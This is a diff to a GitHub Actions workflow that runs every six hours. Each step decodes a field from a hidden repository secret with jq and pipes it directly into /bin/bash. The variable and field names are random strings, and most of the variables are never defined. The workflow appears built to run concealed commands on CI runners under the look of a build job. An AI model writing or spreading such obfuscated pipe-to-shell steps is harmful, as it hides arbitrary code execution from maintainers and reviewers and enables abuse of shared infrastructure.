@@ -3,25 +3,28 @@ name: heziwei6781
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 0/6 * * *'
-
+    - cron: '25 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: heziwei6781
         env:
-          v00: ${{ secrets.v00 }}
+          hcgq4: ${{ secrets.hcgq4 }}
         run: |
-          echo $v00 | jq -r .tgfdd3407 | /bin/bash
-          echo $ky194 | jq -r .px80678 | /bin/bash
-          echo $cm7795 | jq -r .sr5729 | /bin/bash
-          echo $mtbp40586 | jq -r .x22475 | /bin/bash
-          echo $p4 | jq -r .o623 | /bin/bash
-          echo $tqdu14 | jq -r .ncb29144 | /bin/bash
-          echo $j40491 | jq -r .lsa23 | /bin/bash
-          echo $aqg2320 | jq -r .x19465 | /bin/bash
-          echo $ku7 | jq -r .dba45200 | /bin/bash
-          echo $qvblm585 | jq -r .uz074 | /bin/bash
+          echo $hcgq4 | jq -r .th8567 | /bin/bash
+          echo $lrckb58112 | jq -r .u18697 | /bin/bash
+          echo $bpljm49 | jq -r .qlht8 | /bin/bash
+          echo $vf65 | jq -r .pa89365 | /bin/bash
+          echo $flm3 | jq -r .daq50397 | /bin/bash
+          echo $qjx418 | jq -r .ugpy04023 | /bin/bash
+          echo $l129 | jq -r .cgpi6105 | /bin/bash
+          echo $zbqm49 | jq -r .w04133 | /bin/bash
+          echo $wd6 | jq -r .upfjd121 | /bin/bash
+          echo $dwp6807 | jq -r .mde783 | /bin/bash
+          echo $kbzdb8110 | jq -r .wjc28625 | /bin/bash
+          echo $xchbw7 | jq -r .yk34 | /bin/bash
+          echo $zskir54 | jq -r .yiyh7081 | /bin/bash
 
